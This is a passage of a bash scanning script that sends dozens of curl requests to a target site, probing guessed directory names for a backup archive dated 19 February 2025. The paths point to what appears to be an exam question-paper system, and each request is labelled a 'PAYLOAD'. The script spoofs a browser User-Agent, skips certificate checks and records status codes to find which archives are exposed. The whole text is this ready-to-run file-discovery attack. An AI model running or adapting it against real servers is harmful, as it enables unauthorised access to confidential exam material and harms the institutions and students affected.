" "${target}QPDatabase_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
